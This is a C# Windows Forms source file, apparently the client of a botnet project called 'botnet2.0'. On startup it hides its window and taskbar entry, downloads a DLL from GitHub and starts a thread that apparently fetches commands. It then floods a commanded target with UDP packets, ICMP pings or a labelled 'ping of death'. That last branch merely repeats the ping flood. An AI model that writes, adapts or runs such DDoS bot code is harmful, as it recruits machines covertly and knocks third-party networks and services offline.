using System;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.Net.NetworkInformation;

namespace botnet2._0
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }
        public static Instruction botinstruction = new Instruction();
        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                ShowInTaskbar = false;
                WindowState = FormWindowState.Minimized;
                functions.add();
                new WebClient().DownloadFile("https://github.com/ErrorVania/botnet2.0/blob/master/botnet2.0/bin/Debug/Newtonsoft.Json.dll","Newtonsoft.Json.dll");
                ThreadStart thread1 = new ThreadStart(functions.refresh);
                Thread refresher = new Thread(thread1);
                refresher.Start();

                Thread.Sleep(3001);
                //start
                ThreadStart thread2 = new ThreadStart(attack);
                Thread refresher2 = new Thread(thread2);
                refresher2.Start();
            } catch (Exception ex) { MessageBox.Show(ex.ToString()); }
        }
        private void attack()
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(botinstruction.Target), botinstruction.Port);
            Ping pingSender = new Ping();
            int timeout = 1;
            while (botinstruction.DOS_Type != Instruction.AttackTypes.None)
            {
                while (botinstruction.DOS_Type == Instruction.AttackTypes.UDP_Flood)
                {
                    byte[] send_buffer = Encoding.ASCII.GetBytes(dos_methods.Somehelp.RandomString(botinstruction.Packetsize));
                    socket.SendTo(send_buffer, endPoint);
                }
                while (botinstruction.DOS_Type == Instruction.AttackTypes.ICMP_Ping)
                {
                    string data = dos_methods.Somehelp.RandomString(botinstruction.Packetsize);
                    byte[] buffer = Encoding.ASCII.GetBytes(data);
                    pingSender.Send(botinstruction.Target, timeout, buffer, null);
                }
                while (botinstruction.DOS_Type == Instruction.AttackTypes.POD)
                {
                    string data = dos_methods.Somehelp.RandomString(botinstruction.Packetsize);
                    byte[] buffer = Encoding.ASCII.GetBytes(data);
                    pingSender.Send(botinstruction.Target, timeout, buffer, null);
                }
            }
        }
    }
}
